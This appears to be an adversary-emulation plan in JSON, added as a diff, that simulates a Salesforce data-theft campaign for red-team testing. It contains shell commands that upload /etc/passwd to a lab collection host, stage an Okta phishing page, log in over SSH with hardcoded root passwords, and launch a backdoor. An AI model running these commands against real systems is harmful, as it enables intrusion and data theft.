@@ -1,0 +1,567 @@
+{
+  "abilities": [
+    {
+      "ability_id": "0f9addbf-87ae-5241-bd7f-598572e0f79a",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors created malicious applications within Salesforce trial accounts, typically Python scripts with similar function to the Salesforce Data Loader.",
+      "executors": [
+        {
+          "command": "curl -F \"file=@/usr/lib/python3.13/io.py\" http://192.168.20.30:8116/upload",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1587.001 - Malware",
+      "tactic": "resource-development",
+      "technique_id": "T1587.001",
+      "technique_name": "Malware",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "12917c20-3d06-56f6-920f-e3069f778b5a",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors established an Okta phishing panel which victims were tricked into accessing from mobile phones or work computers during social engineering calls.",
+      "executors": [
+        {
+          "command": "curl http://192.168.20.30/ > okta_fake_login.html && echo \"Send the link http://192.168.20.30/ to target users for credential harvesting\"",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1608.005 - Link Target",
+      "tactic": "resource-development",
+      "technique_id": "T1608.005",
+      "technique_name": "Link Target",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "18f9319b-b775-5ebf-b17e-e21a7ab586e6",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors exfiltrated data via legitimate Salesforce API communication channels including the Salesforce Data Loader application.",
+      "executors": [
+        {
+          "command": "curl -F \"file=@/etc/passwd\" http://192.168.20.30:8116/upload",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1567 - Exfiltration Over Web Service",
+      "tactic": "exfiltration",
+      "technique_id": "T1567",
+      "technique_name": "Exfiltration Over Web Service",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "2d5304bd-6a63-5ca2-976c-f913f6137680",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors deceived victims into authorizing malicious connected apps to their organization's Salesforce portal.",
+      "executors": [
+        {
+          "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"client_id\":\"malicious_app\"}' http://192.168.20.30:8444/oauth/authorize && TOKEN=$(curl -s -X POST -H \"Content-Type: application/json\" -d '{\"client_id\":\"malicious_app\"}' http://192.168.20.30:8444/oauth/authorize | sed -n 's/.*\"access_token\" *: *\"\\([^\"]*\\)\".*/\\1/p') && curl -H \"Authorization: Bearer $TOKEN\" http://192.168.20.30:8444/data",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1671 - Cloud Application Integration",
+      "tactic": "persistence",
+      "technique_id": "T1671",
+      "technique_name": "Cloud Application Integration",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "2dc1a045-eacd-5913-a859-4ffaa278bb95",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors created Salesforce trial accounts to register their malicious applications.",
+      "executors": [
+        {
+          "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 \"id -u fakepersona &>/dev/null || useradd -m fakepersona; echo 'fakepersona:FakePass123' | chpasswd\" \nsshpass -p 'FakePass123' ssh -o StrictHostKeyChecking=no fakepersona@192.168.20.30 'hostname; whoami; echo \"=====\"; echo \"$(whoami) on $(uname -n) registering something using fakepersona.\"'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1585 - Establish Accounts",
+      "tactic": "resource-development",
+      "technique_id": "T1585",
+      "technique_name": "Establish Accounts",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "4ee0d3f9-e5b7-5f9c-b056-e6a32b10b390",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors used API queries to automatically exfiltrate large volumes of data.",
+      "executors": [
+        {
+          "command": "curl -F \"file=@/etc/passwd\" http://192.168.20.30:8116/upload",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1020 - Automated Exfiltration",
+      "tactic": "exfiltration",
+      "technique_id": "T1020",
+      "technique_name": "Automated Exfiltration",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "4f9c0cbe-3451-5f25-ad4c-390050bccca5",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors initially relied on the legitimate Salesforce Data Loader app for data exfiltration.",
+      "executors": [
+        {
+          "command": "curl -F \"file=@/etc/passwd\" http://192.168.20.30:8116/upload",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1588.002 - Tool",
+      "tactic": "resource-development",
+      "technique_id": "T1588.002",
+      "technique_name": "Tool",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "5ef6da68-ae22-5f81-b0b3-6599be6e710c",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors initiated voice calls with victims to socially engineer them into authorizing malicious applications or divulging sensitive credentials.",
+      "executors": [
+        {
+          "command": "echo 'Run some automatic call script with a wav play here'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1598.004 - Spearphishing Voice",
+      "tactic": "reconnaissance",
+      "technique_id": "T1598.004",
+      "technique_name": "Spearphishing Voice",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "63b51f2a-add5-53b2-b4bb-b16d8119439f",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors used Tor IPs for voice calls and for the collection of stolen data.",
+      "executors": [
+        {
+          "command": "curl --proxy http://192.168.20.30:8888 http://192.168.30.40",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1090.003 - Multi-hop Proxy",
+      "tactic": "command-and-control",
+      "technique_id": "T1090.003",
+      "technique_name": "Multi-hop Proxy",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "8159d414-b99e-5397-91a9-5f36cbf89964",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors used custom applications developed in python.",
+      "executors": [
+        {
+          "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'if ! ss -tuln | grep -q \":5055 \"; then su attacker -c \"python3 /home/attacker/malware/backdoor.py &\"; else echo \"Port 5055 already in use\"; fi'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1059.006 - Python",
+      "tactic": "execution",
+      "technique_id": "T1059.006",
+      "technique_name": "Python",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "8660e027-d92c-5cb3-96d9-dc40a3d28852",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors impersonated IT support personnel in voice calls with victims at times claiming to be addressing enterprise-wide connectivity issues.",
+      "executors": [
+        {
+          "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"Click here and give me your password\" | mail -s \"Password Expired\" victim@192.168.30.40'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1656 - Impersonation",
+      "tactic": "defense-evasion",
+      "technique_id": "T1656",
+      "technique_name": "Impersonation",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "8660e027-d92c-5cb3-96d9-rothsales",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "This is the end.",
+      "executors": [
+        {
+          "command": "echo \"END OF SALESFORCE DATA EXFILTRATION\"",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "END OF SALESFORCE DATA EXFILTRATION",
+      "tactic": "impact",
+      "technique_id": "T1529",
+      "technique_name": "System Shutdown",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "af896dcb-4434-54a2-9543-9607b8082cea",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors queried customers' Salesforce environments to identify sensitive information for exfiltration.",
+      "executors": [
+        {
+          "command": "sshpass -p 'RootPass123' ssh root@192.168.20.30 'ls -la / && find / -maxdepth 2 -type d'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1083 - File and Directory Discovery",
+      "tactic": "discovery",
+      "technique_id": "T1083",
+      "technique_name": "File and Directory Discovery",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "c2e8c040-acd8-5e5e-9060-fa2a1101c0f1",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors used voice calls to socially engineer victims into authorizing a modified version of the Salesforce Data Loader app.",
+      "executors": [
+        {
+          "command": "curl -X POST -F 'cmd=whoami' http://192.168.20.30:5055/exec",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1036 - Masquerading",
+      "tactic": "defense-evasion",
+      "technique_id": "T1036",
+      "technique_name": "Masquerading",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "c309ecb4-b9e4-5871-91c3-893a48b95d8f",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors used compromised credentials for lateral movement.",
+      "executors": [
+        {
+          "command": "smbclient -L //192.168.20.30 -U DebianUser%DebianUser && smbclient //192.168.20.30/share -U DebianUser%DebianUser -c 'dir'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1078.002 - Domain Accounts",
+      "tactic": "defense-evasion",
+      "technique_id": "T1078.002",
+      "technique_name": "Domain Accounts",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "d2572d0e-9e91-5838-91eb-2aea2197ea42",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors used compromised emails to create Salesforce trial accounts.",
+      "executors": [
+        {
+          "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 \"id -u fakepersonax &>/dev/null || useradd -m fakepersonax; echo 'fakepersonax:FakePass123' | chpasswd\" \nsshpass -p 'FakePass123' ssh -o StrictHostKeyChecking=no fakepersonax@192.168.20.30 'hostname; whoami; echo \"=====\"; echo \"$(whoami) on $(uname -n) registering something using fakepersona.\"'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1586.002 - Email Accounts",
+      "tactic": "resource-development",
+      "technique_id": "T1586.002",
+      "technique_name": "Email Accounts",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "e8b4f102-ec88-5475-85ca-f6ac2105292b",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors used Mullvad VPN IPs to proxy voice phishing calls.",
+      "executors": [
+        {
+          "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p \"RootPass123\" ssh -o StrictHostKeyChecking=no root@192.168.30.40 \"cat /etc/passwd\"'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1090 - Proxy",
+      "tactic": "command-and-control",
+      "technique_id": "T1090",
+      "technique_name": "Proxy",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "ee7a720f-a8d4-5ee0-9565-efa047f87a15",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors registered emails shinycorp@tuta[.]com and shinygroup@tuta[.]com to send victims extortion demands.",
+      "executors": [
+        {
+          "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"Test email from attacker\" | mail -s \"Test Subject\" shinycorp@192.168.30.40'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1585.002 - Email Accounts",
+      "tactic": "resource-development",
+      "technique_id": "T1585.002",
+      "technique_name": "Email Accounts",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "f3991dd7-ab99-5f9c-94de-48184558333e",
+      "campaign_id": "salesforce_data_exfiltration",
+      "description": "During Salesforce Data Exfiltration, threat actors accessed and exfiltrated sensitive information from compromised Salesforce instances.",
+      "executors": [
+        {
+          "command": "curl http://192.168.20.30/crm.php",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1213.004 - Customer Relationship Management Software",
+      "tactic": "collection",
+      "technique_id": "T1213.004",
+      "technique_name": "Customer Relationship Management Software",
+      "translation_source": "human_curation"
+    }
+  ],
+  "adversary": {
+    "atomic_ordering": [
+      "12917c20-3d06-56f6-920f-e3069f778b5a",
+      "8159d414-b99e-5397-91a9-5f36cbf89964",
+      "f3991dd7-ab99-5f9c-94de-48184558333e",
+      "2d5304bd-6a63-5ca2-976c-f913f6137680",
+      "c309ecb4-b9e4-5871-91c3-893a48b95d8f",
+      "18f9319b-b775-5ebf-b17e-e21a7ab586e6",
+      "c2e8c040-acd8-5e5e-9060-fa2a1101c0f1",
+      "e8b4f102-ec88-5475-85ca-f6ac2105292b",
+      "ee7a720f-a8d4-5ee0-9565-efa047f87a15",
+      "af896dcb-4434-54a2-9543-9607b8082cea",
+      "63b51f2a-add5-53b2-b4bb-b16d8119439f",
+      "2dc1a045-eacd-5913-a859-4ffaa278bb95",
+      "0f9addbf-87ae-5241-bd7f-598572e0f79a",
+      "4f9c0cbe-3451-5f25-ad4c-390050bccca5",
+      "4ee0d3f9-e5b7-5f9c-b056-e6a32b10b390",
+      "d2572d0e-9e91-5838-91eb-2aea2197ea42",
+      "5ef6da68-ae22-5f81-b0b3-6599be6e710c",
+      "8660e027-d92c-5cb3-96d9-dc40a3d28852",
+      "8660e027-d92c-5cb3-96d9-rothsales"
+    ],
+    "campaign_id": "salesforce_data_exfiltration",
+    "description": "Salesforce Data Exfiltration emulation plan with 18 techniques",
+    "id": "096f69b7-f698-579c-82b9-8b013406bd14",
+    "name": "Salesforce Data Exfiltration",
+    "translation_source": "human_curation"
+  },
+  "attack_flow": {
+    "campaign_id": "salesforce_data_exfiltration",
+    "content": {
+      "campaign_name": "Salesforce Data Exfiltration",
+      "edges": [
+        {
+          "from": "5521de91-f38d-441f-8218-ade93a12dfa7",
+          "to": "6abc9383-e24f-4126-a5a2-8a3737fc2ebf"
+        },
+        {
+          "from": "6abc9383-e24f-4126-a5a2-8a3737fc2ebf",
+          "to": "a5d0f1d0-b9b2-4a3a-a855-732737ec67a6"
+        },
+        {
+          "from": "a5d0f1d0-b9b2-4a3a-a855-732737ec67a6",
+          "to": "aa1d940d-87c0-4fcc-bd7c-66fdf0f455d9"
+        },
+        {
+          "from": "aa1d940d-87c0-4fcc-bd7c-66fdf0f455d9",
+          "to": "895d1ea1-1841-476e-85af-5144bfef843b"
+        },
+        {
+          "from": "895d1ea1-1841-476e-85af-5144bfef843b",
+          "to": "1dceef18-a7c0-43b4-85cb-68a27b452615"
+        },
+        {
+          "from": "1dceef18-a7c0-43b4-85cb-68a27b452615",
+          "to": "b416b8c7-56e3-4776-9c42-395c9ee54ac4"
+        },
+        {
+          "from": "b416b8c7-56e3-4776-9c42-395c9ee54ac4",
+          "to": "632d1194-f237-4866-9955-876afe5c66a9"
+        },
+        {
+          "from": "632d1194-f237-4866-9955-876afe5c66a9",
+          "to": "ead35c74-f5b4-4815-84be-4ab46417f14e"
+        },
+        {
+          "from": "ead35c74-f5b4-4815-84be-4ab46417f14e",
+          "to": "60314478-c12d-4b58-a1e6-61b0266e35a9"
+        },
+        {
+          "from": "60314478-c12d-4b58-a1e6-61b0266e35a9",
+          "to": "324222fc-6b0e-4c6e-be4f-af4341b9638e"
+        },
+        {
+          "from": "324222fc-6b0e-4c6e-be4f-af4341b9638e",
+          "to": "cfac895c-b867-4a99-a75f-8ebc9ea7a627"
+        },
+        {
+          "from": "cfac895c-b867-4a99-a75f-8ebc9ea7a627",
+          "to": "81c697e5-93ad-4fba-a95c-d8ccc24d177c"
+        },
+        {
+          "from": "81c697e5-93ad-4fba-a95c-d8ccc24d177c",
+          "to": "02cc5bfb-7791-43b9-a79b-f65960ac0296"
+        },
+        {
+          "from": "02cc5bfb-7791-43b9-a79b-f65960ac0296",
+          "to": "66ce7433-d369-43df-b456-c0588adbe640"
+        },
+        {
+          "from": "66ce7433-d369-43df-b456-c0588adbe640",
+          "to": "8bef15d9-9b74-4db3-a894-a1b7c09ca128"
+        },
+        {
+          "from": "8bef15d9-9b74-4db3-a894-a1b7c09ca128",
+          "to": "bde025cc-9f68-45dc-b78b-3cfdb7289ea4"
+        },
+        {
+          "from": "bde025cc-9f68-45dc-b78b-3cfdb7289ea4",
+          "to": "f6124c14-f847-42a0-8a14-eae3eea4c01e"
+        }
+      ],
+      "structural_nodes": [
+        {
+          "node_id": "5521de91-f38d-441f-8218-ade93a12dfa7",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1608.005",
+          "technique_name": "Link Target"
+        },
+        {
+          "node_id": "6abc9383-e24f-4126-a5a2-8a3737fc2ebf",
+          "node_type": "structural",
+          "tactic": "execution",
+          "technique_id": "T1059.006",
+          "technique_name": "Python"
+        },
+        {
+          "node_id": "a5d0f1d0-b9b2-4a3a-a855-732737ec67a6",
+          "node_type": "structural",
+          "tactic": "collection",
+          "technique_id": "T1213.004",
+          "technique_name": "Customer Relationship Management Software"
+        },
+        {
+          "node_id": "aa1d940d-87c0-4fcc-bd7c-66fdf0f455d9",
+          "node_type": "structural",
+          "tactic": "persistence",
+          "technique_id": "T1671",
+          "technique_name": "Cloud Application Integration"
+        },
+        {
+          "node_id": "895d1ea1-1841-476e-85af-5144bfef843b",
+          "node_type": "structural",
+          "tactic": "defense-evasion",
+          "technique_id": "T1078.002",
+          "technique_name": "Domain Accounts"
+        },
+        {
+          "node_id": "1dceef18-a7c0-43b4-85cb-68a27b452615",
+          "node_type": "structural",
+          "tactic": "exfiltration",
+          "technique_id": "T1567",
+          "technique_name": "Exfiltration Over Web Service"
+        },
+        {
+          "node_id": "b416b8c7-56e3-4776-9c42-395c9ee54ac4",
+          "node_type": "structural",
+          "tactic": "defense-evasion",
+          "technique_id": "T1036",
+          "technique_name": "Masquerading"
+        },
+        {
+          "node_id": "632d1194-f237-4866-9955-876afe5c66a9",
+          "node_type": "structural",
+          "tactic": "command-and-control",
+          "technique_id": "T1090",
+          "technique_name": "Proxy"
+        },
+        {
+          "node_id": "ead35c74-f5b4-4815-84be-4ab46417f14e",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1585.002",
+          "technique_name": "Email Accounts"
+        },
+        {
+          "node_id": "60314478-c12d-4b58-a1e6-61b0266e35a9",
+          "node_type": "structural",
+          "tactic": "discovery",
+          "technique_id": "T1083",
+          "technique_name": "File and Directory Discovery"
+        },
+        {
+          "node_id": "324222fc-6b0e-4c6e-be4f-af4341b9638e",
+          "node_type": "structural",
+          "tactic": "command-and-control",
+          "technique_id": "T1090.003",
+          "technique_name": "Multi-hop Proxy"
+        },
+        {
+          "node_id": "cfac895c-b867-4a99-a75f-8ebc9ea7a627",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1585",
+          "technique_name": "Establish Accounts"
+        },
+        {
+          "node_id": "81c697e5-93ad-4fba-a95c-d8ccc24d177c",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1587.001",
+          "technique_name": "Malware"
+        },
+        {
+          "node_id": "02cc5bfb-7791-43b9-a79b-f65960ac0296",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1588.002",
+          "technique_name": "Tool"
+        },
+        {
+          "node_id": "66ce7433-d369-43df-b456-c0588adbe640",
+          "node_type": "structural",
+          "tactic": "exfiltration",
+          "technique_id": "T1020",
+          "technique_name": "Automated Exfiltration"
+        },
+        {
+          "node_id": "8bef15d9-9b74-4db3-a894-a1b7c09ca128",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1586.002",
+          "technique_name": "Email Accounts"
+        },
+        {
+          "node_id": "bde025cc-9f68-45dc-b78b-3cfdb7289ea4",
+          "node_type": "structural",
+          "tactic": "reconnaissance",
+          "technique_id": "T1598.004",
+          "technique_name": "Spearphishing Voice"
+        },
+        {
+          "node_id": "f6124c14-f847-42a0-8a14-eae3eea4c01e",
+          "node_type": "structural",
+          "tactic": "defense-evasion",
+          "technique_id": "T1656",
+          "technique_name": "Impersonation"
+        }
+      ]
+    },
+    "identifier": "human-curation-v1",
+    "label": "Salesforce Data Exfiltration"
+  },
+  "campaign": {
+    "description": "Salesforce Data Exfiltration",
+    "id": "salesforce_data_exfiltration",
+    "name": "Salesforce Data Exfiltration",
+    "translation_source": "human_curation"
+  }
+}
